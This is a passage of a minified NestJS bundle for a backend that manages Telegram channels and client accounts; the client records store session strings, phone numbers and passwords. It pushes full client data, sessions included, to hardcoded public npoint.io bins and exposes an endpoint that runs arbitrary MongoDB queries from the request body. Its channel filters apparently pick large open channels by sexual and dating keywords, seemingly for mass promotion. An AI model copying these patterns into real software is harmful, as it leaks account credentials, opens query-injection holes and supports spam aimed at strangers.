n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(6954);let p=class{constructor(e,t){this.buildModel=e,this.npointSerive=t}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=await this.buildModel.findOne({}).exec();if(!e)throw new a.NotFoundException("buildModel not found");return e}async update(e){delete e._id;const t=await this.buildModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();try{await this.npointSerive.updateDocument("3375d15db1eece560188",t),console.log("Updated document successfully in npoint")}catch(e){console.log(e)}if(!t)throw new a.NotFoundException("buildModel not found");return t}};t.BuildService=p,t.BuildService=p=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)("buildModule")),o("design:paramtypes",[c.Model,l.NpointService])],p)},6877:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.BuildSchema=t.Build=void 0;const r=i(5839),a=o(i(6037));let s=class{};t.Build=s,t.Build=s=n([(0,r.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],s),t.BuildSchema=r.SchemaFactory.createForClass(s),t.BuildSchema.add({type:a.default.Schema.Types.Mixed})},4288:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsController=void 0;const a=i(3563),s=i(9597),c=i(9742),l=i(6847),p=i(5127),d=i(1734);let u=class{constructor(e){this.channelsService=e}async create(e){return this.channelsService.create(e)}async createMultiple(e){return this.channelsService.createMultiple(e)}search(e){return console.log(e),this.channelsService.search(e)}async findAll(){return this.channelsService.findAll()}async findOne(e){return this.channelsService.findOne(e)}async update(e,t){return this.channelsService.update(e,t)}async remove(e){return this.channelsService.remove(e)}};t.ChannelsController=u,n([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new  channel"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[p.CreateChannelDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Post)("createMultiple"),(0,c.ApiOperation)({summary:"Create multiple channels"}),(0,c.ApiBody)({type:[p.CreateChannelDto]}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Array]),o("design:returntype",Promise)],u.prototype,"createMultiple",null),n([(0,a.Get)("search"),(0,c.ApiOperation)({summary:"Search channels by filters"}),(0,c.ApiQuery)({name:"channelId",required:!1,type:String}),(0,c.ApiQuery)({name:"broadcast",required:!1,type:Boolean}),(0,c.ApiQuery)({name:"canSendMsgs",required:!1,type:Boolean}),(0,c.ApiQuery)({name:"participantsCount",required:!1,type:Number}),(0,c.ApiQuery)({name:"restricted",required:!1,type:Boolean}),(0,c.ApiQuery)({name:"sendMessages",required:!1,type:Boolean}),(0,c.ApiQuery)({name:"title",required:!1,type:String}),(0,c.ApiQuery)({name:"username",required:!1,type:String}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[l.SearchChannelDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all  channels"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)(":channelId"),(0,c.ApiOperation)({summary:"Get an  channel by channelId"}),r(0,(0,a.Param)("channelId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":channelId"),(0,c.ApiOperation)({summary:"Update an  channel by channelId"}),r(0,(0,a.Param)("channelId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateChannelDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":channelId"),(0,c.ApiOperation)({summary:"Delete an  channel by channelId"}),r(0,(0,a.Param)("channelId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),t.ChannelsController=u=n([(0,c.ApiTags)("Channels"),(0,a.Controller)("channels"),o("design:paramtypes",[s.ChannelsService])],u)},1324:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsModule=void 0;const o=i(3563),r=i(5839),a=i(9597),s=i(4288),c=i(8029),l=i(5774);let p=class{};t.ChannelsModule=p,t.ChannelsModule=p=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:c.Channel.name,schema:c.ChannelSchema}])],controllers:[s.ChannelsController],providers:[a.ChannelsService],exports:[a.ChannelsService]})],p)},9597:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelsService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(8029);let p=class{constructor(e){this.ChannelModel=e,console.log(l.Channel.name)}async create(e){return new this.ChannelModel(e).save()}async createMultiple(e){const t=e.map((e=>({updateOne:{filter:{channelId:e.channelId},update:{$set:e},upsert:!0}})));return await this.ChannelModel.bulkWrite(t,{ordered:!1}),"Channels Saved"}async findAll(){return this.ChannelModel.find().exec()}async findOne(e){const t=(await this.ChannelModel.findOne({channelId:e}).exec())?.toJSON();return t}async update(e,t){return await this.ChannelModel.findOneAndUpdate({channelId:e},{$set:t},{new:!0,upsert:!0}).exec()}async remove(e){await this.ChannelModel.findOneAndDelete({channelId:e}).exec()}async search(e){return console.log(e),this.ChannelModel.find(e).exec()}async getChannels(e=50,t=0,i=[],n=[]){const o=new RegExp(i.join("|"),"i"),r=new RegExp("online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser","i");let a={$and:[{username:{$ne:null}},{$or:[{title:{$regex:o}},{username:{$regex:o}}]},{username:{$not:{$regex:"^("+n.map((e=>"(?i)"+e?.replace(/[.*+?^${}()|[\]\\]/g,"\\$&")))?.join("|")+")$"}}},{title:{$not:{$regex:r}}},{username:{$not:{$regex:r}}},{sendMessages:!1,broadcast:!1,restricted:!1}]};const s={participantsCount:"desc"};try{return await this.ChannelModel.find(a).sort(s).skip(t).limit(e).exec()}catch(e){return console.error("Error:",e),[]}}async executeQuery(e,t,i){try{if(!e)throw new a.BadRequestException("Query is invalid.");const n=this.ChannelModel.find(e);return t&&n.sort(t),i&&n.limit(i),await n.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async getActiveChannels(e=50,t=0,i=[]){const n={$and:[{$or:[{title:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}},{username:{$regex:/wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i}}]},{$or:[{title:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}},{username:{$not:{$regex:/online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i}}}]},{channelId:{$nin:i},participantsCount:{$gt:1e3},username:{$ne:null},canSendMsgs:!0,restricted:!1,forbidden:!1}]},o=(i.length,{participantsCount:-1});try{return await this.ChannelModel.aggregate([{$match:n},{$skip:t},{$limit:e},{$addFields:{randomField:{$rand:{}}}},{$sort:o},{$project:{randomField:0}}]).exec()}catch(e){return console.error("Error:",e),[]}}};t.ChannelsService=p,t.ChannelsService=p=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.Channel.name)),o("design:paramtypes",[c.Model])],p)},5127:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateChannelDto=void 0;const r=i(9742);class a{constructor(){this.private=!1,this.forbidden=!1}}t.CreateChannelDto=a,n([(0,r.ApiProperty)({description:"Unique identifier for the channel",example:"803387987"}),o("design:type",String)],a.prototype,"channelId",void 0),n([(0,r.ApiProperty)({description:"Whether the channel is a broadcast channel",example:null,required:!1}),o("design:type",Boolean)],a.prototype,"broadcast",void 0),n([(0,r.ApiProperty)({description:"Indicates if the channel can send messages",example:!0}),o("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),n([(0,r.ApiProperty)({description:"Whether the channel is a megagroup",example:null,required:!1}),o("design:type",Boolean)],a.prototype,"megagroup",void 0),n([(0,r.ApiProperty)({description:"Number of participants in the channel",example:0}),o("design:type",Number)],a.prototype,"participantsCount",void 0),n([(0,r.ApiProperty)({description:"Whether the channel is restricted",example:null,required:!1}),o("design:type",Boolean)],a.prototype,"restricted",void 0),n([(0,r.ApiProperty)({description:"Whether the channel can send messages",example:null,required:!1}),o("design:type",Boolean)],a.prototype,"sendMessages",void 0),n([(0,r.ApiProperty)({description:"Title of the channel",example:"Earn money with Ayesha"}),o("design:type",String)],a.prototype,"title",void 0),n([(0,r.ApiProperty)({description:"Username of the channel",example:null,required:!1}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiProperty)({description:"Whether the channel is private",example:!1,required:!1}),o("design:type",Boolean)],a.prototype,"private",void 0),n([(0,r.ApiProperty)({default:!1,example:!1,required:!1}),o("design:type",Boolean)],a.prototype,"forbidden",void 0)},6847:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchChannelDto=void 0;const r=i(9742);class a{}t.SearchChannelDto=a,n([(0,r.ApiPropertyOptional)({description:"Unique identifier for the channel",example:"803387987"}),o("design:type",String)],a.prototype,"channelId",void 0),n([(0,r.ApiPropertyOptional)({description:"Title of the channel",example:"Earn money with Ayesha"}),o("design:type",String)],a.prototype,"title",void 0),n([(0,r.ApiPropertyOptional)({description:"privacy of the channel",example:!1}),o("design:type",String)],a.prototype,"private",void 0),n([(0,r.ApiPropertyOptional)({description:"Username of the channel",example:"ayesha_channel"}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiPropertyOptional)({description:"Indicates if the channel can send messages",example:!0}),o("design:type",Boolean)],a.prototype,"canSendMsgs",void 0),n([(0,r.ApiPropertyOptional)({description:"Minimum number of participants in the channel",example:10}),o("design:type",Number)],a.prototype,"minParticipantsCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Maximum number of participants in the channel",example:100}),o("design:type",Number)],a.prototype,"maxParticipantsCount",void 0)},1734:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateChannelDto=void 0;const n=i(9742),o=i(5127);class r extends((0,n.PartialType)(o.CreateChannelDto)){}t.UpdateChannelDto=r},8029:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},a=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.ChannelSchema=t.Channel=void 0;const c=i(5839),l=a(i(6037));let p=class{};t.Channel=p,r([(0,c.Prop)({required:!0,unique:!0}),s("design:type",String)],p.prototype,"channelId",void 0),r([(0,c.Prop)({default:!1}),s("design:type",Boolean)],p.prototype,"broadcast",void 0),r([(0,c.Prop)({default:!0}),s("design:type",Boolean)],p.prototype,"canSendMsgs",void 0),r([(0,c.Prop)({type:l.Schema.Types.Number,default:0}),s("design:type",Number)],p.prototype,"participantsCount",void 0),r([(0,c.Prop)({default:!1}),s("design:type",Boolean)],p.prototype,"restricted",void 0),r([(0,c.Prop)({default:!1}),s("design:type",Boolean)],p.prototype,"sendMessages",void 0),r([(0,c.Prop)({required:!0}),s("design:type",String)],p.prototype,"title",void 0),r([(0,c.Prop)({required:!1,default:null}),s("design:type",String)],p.prototype,"username",void 0),r([(0,c.Prop)({required:!0,default:!1}),s("design:type",Boolean)],p.prototype,"private",void 0),r([(0,c.Prop)({default:!1,required:!1}),s("design:type",Boolean)],p.prototype,"forbidden",void 0),t.Channel=p=r([(0,c.Schema)({collection:"channels",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],p),t.ChannelSchema=c.SchemaFactory.createForClass(p)},3209:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientController=void 0;const a=i(3563),s=i(9742),c=i(5562),l=i(9815),p=i(1167),d=i(7908);let u=class{constructor(e){this.clientService=e}async create(e){try{return await this.clientService.create(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async search(e){try{return await this.clientService.search(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async updateClient(e){return this.clientService.updateClient(e),"Update client initiated"}async findAllMasked(e){try{return await this.clientService.findAllMasked(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findAll(){try{return await this.clientService.findAll()}catch(e){throw new a.HttpException(e.message,a.HttpStatus.INTERNAL_SERVER_ERROR)}}async findOne(e){try{return await this.clientService.findOne(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async update(e,t){try{return await this.clientService.update(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async remove(e){try{return await this.clientService.remove(e)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async executeQuery(e){const{query:t,sort:i,limit:n,skip:o}=e;try{return await this.clientService.executeQuery(t,i,n,o)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.BAD_REQUEST)}}async addPromoteMobile(e,t){try{return await this.clientService.addPromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}async removePromoteMobile(e,t){try{return await this.clientService.removePromoteMobile(e,t)}catch(e){throw new a.HttpException(e.message,a.HttpStatus.NOT_FOUND)}}};t.ClientController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),(0,s.ApiResponse)({status:201,description:"The user data has been successfully created."}),(0,s.ApiResponse)({status:400,description:"Invalid input data."}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateClientDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiQuery)({name:"clientId",required:!1,description:"Client ID"}),(0,s.ApiQuery)({name:"dbcoll",required:!1,description:"Database collection name"}),(0,s.ApiQuery)({name:"channelLink",required:!1,description:"Channel link"}),(0,s.ApiQuery)({name:"link",required:!1,description:"Client link"}),(0,s.ApiResponse)({status:200,description:"Matching user data returned successfully."}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchClientDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)("updateClient/:clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("clientId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"updateClient",null),n([(0,a.Get)("maskedCls"),(0,s.ApiOperation)({summary:"Get all user data with masked fields"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchClientDto]),o("design:returntype",Promise)],u.prototype,"findAllMasked",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),(0,s.ApiResponse)({status:200,description:"All user data returned successfully."}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)(":clientId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),(0,s.ApiResponse)({status:200,description:"User data returned successfully."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":clientId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully updated."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateClientDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":clientId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),(0,s.ApiResponse)({status:200,description:"The user data has been successfully deleted."}),(0,s.ApiResponse)({status:404,description:"User data not found."}),r(0,(0,a.Param)("clientId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiResponse)({status:200,description:"Query executed successfully."}),(0,s.ApiResponse)({status:400,description:"Invalid query."}),(0,s.ApiBody)({schema:{properties:{query:{type:"object"},sort:{type:"object"},limit:{type:"number"},skip:{type:"number"}}}}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),n([(0,a.Patch)(":clientId/promoteMobile/add"),(0,s.ApiOperation)({summary:"Add a mobile number to the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number added successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)("mobileNumber")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],u.prototype,"addPromoteMobile",null),n([(0,a.Patch)(":clientId/promoteMobile/remove"),(0,s.ApiOperation)({summary:"Remove a mobile number from the promoteMobile array for a specific client"}),(0,s.ApiParam)({name:"clientId",description:"The unique identifier of the client"}),(0,s.ApiBody)({schema:{properties:{mobileNumber:{type:"string",example:"916265240911"}}}}),(0,s.ApiResponse)({status:200,description:"Mobile number removed successfully."}),(0,s.ApiResponse)({status:404,description:"Client not found."}),r(0,(0,a.Param)("clientId")),r(1,(0,a.Body)("mobileNumber")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],u.prototype,"removePromoteMobile",null),t.ClientController=u=n([(0,s.ApiTags)("Clients"),(0,a.Controller)("clients"),o("design:paramtypes",[c.ClientService])],u)},8009:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientModule=void 0;const o=i(3563),r=i(5839),a=i(1013),s=i(5562),c=i(3209),l=i(282),p=i(8421),d=i(7422),u=i(6061),m=i(5774),g=i(889);let h=class{};t.ClientModule=h,t.ClientModule=h=n([(0,o.Module)({imports:[m.initModule,r.MongooseModule.forFeature([{name:a.Client.name,schema:a.ClientSchema}]),(0,o.forwardRef)((()=>l.TelegramModule)),(0,o.forwardRef)((()=>p.BufferClientModule)),(0,o.forwardRef)((()=>d.UsersModule)),(0,o.forwardRef)((()=>u.ArchivedClientModule)),g.NpointModule],controllers:[c.ClientController],providers:[s.ClientService],exports:[s.ClientService]})],h)},5562:function(e,t,i){var n=this&&this.__createBinding||(Object.create?function(e,t,i,n){void 0===n&&(n=i);var o=Object.getOwnPropertyDescriptor(t,i);o&&!("get"in o?!t.__esModule:o.writable||o.configurable)||(o={enumerable:!0,get:function(){return t[i]}}),Object.defineProperty(e,n,o)}:function(e,t,i,n){void 0===n&&(n=i),e[n]=t[i]}),o=this&&this.__setModuleDefault||(Object.create?function(e,t){Object.defineProperty(e,"default",{enumerable:!0,value:t})}:function(e,t){e.default=t}),r=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},a=this&&this.__importStar||function(e){if(e&&e.__esModule)return e;var t={};if(null!=e)for(var i in e)"default"!==i&&Object.prototype.hasOwnProperty.call(e,i)&&n(t,e,i);return o(t,e),t},s=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},c=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}},l=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.ClientService=void 0;const p=i(2995),d=i(3563),u=i(5839),m=i(6037),g=i(1013),h=i(4374),y=i(7385),f=i(9127),v=i(9646),b=i(6185),w=a(i(6928)),P=i(6790),S=i(6954),A=l(i(8938)),C=i(3235),I=i(9647),M=i(6250),O=i(3653);let R=Date.now()-25e4,D=class{constructor(e,t,i,n,o,r){this.clientModel=e,this.telegramService=t,this.bufferClientService=i,this.usersService=n,this.archivedClientService=o,this.npointSerive=r,this.clientsMap=new Map,this.lastUpdateMap=new Map,setInterval((async()=>{await this.refreshMap()}),3e5)}async checkNpoint(){const e=(await A.default.get("https://api.npoint.io/7c2682f37bb93ef486ba")).data;for(const t in e){const i=await this.findOne(t,!1);if((0,b.areJsonsNotSame)(i,e[t])){await this.findAll();const e=(0,b.mapToJson)(this.clientsMap);await this.npointSerive.updateDocument("7c2682f37bb93ef486ba",e);const t={};for(const i in e){const{session:n,mobile:o,password:r,promoteMobile:a,...s}=e[i];t[i]=s}await this.npointSerive.updateDocument("f0d1e44d82893490bbde",t);break}}}async create(e){return new this.clientModel(e).save()}async findAll(){if(this.clientsMap.size<20){const e=await this.clientModel.find({},{_id:0,updatedAt:0}).lean();for(const t of e)this.clientsMap.set(t.clientId,t);return console.log("Refreshed Clients"),e}return Array.from(this.clientsMap.values())}async findAllMasked(e){const t=await this.findAll();return(e?t.filter((t=>Object.keys(e).every((i=>t[i]===e[i])))):t).map((e=>{const{session:t,mobile:i,password:n,promoteMobile:o,...r}=e;return r}))}async refreshMap(){console.log("Refreshed Clients"),this.clientsMap.clear()}async findOne(e,t=!0){const i=this.clientsMap.get(e);if(i)return i;{const i=await this.clientModel.findOne({clientId:e},{_id:0,updatedAt:0}).lean().exec();if(this.clientsMap.set(e,i),!i&&t)throw new d.NotFoundException(`Client with ID "${e}" not found`);return i}}async update(e,t){delete t._id,t._doc&&delete t._doc._id,await(0,I.fetchWithTimeout)(`${(0,M.notifbot)()}&text=Updating the Existing client: ${e}`);const i=await this.clientModel.findOneAndUpdate({clientId:e},{$set:t},{new:!0,upsert:!0}).exec();if(!i)throw new d.NotFoundException(`Client with ID "${e}" not found`);return this.clientsMap.set(e,i),await(0,I.fetchWithTimeout)(`${process.env.uptimeChecker}/refreshmap`),await(0,I.fetchWithTimeout)(`${process.env.uptimebot}/refreshmap`),console.log("Refreshed Maps"),i}async remove(e){const t=await this.clientModel.findOneAndDelete({clientId:e}).exec();if(!t)throw new d.NotFoundException(`Client with ID "${e}" not found`);return t}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.clientModel.find(e).exec()}async setupClient(e,t){if(console.log(`Received New Client Request for - 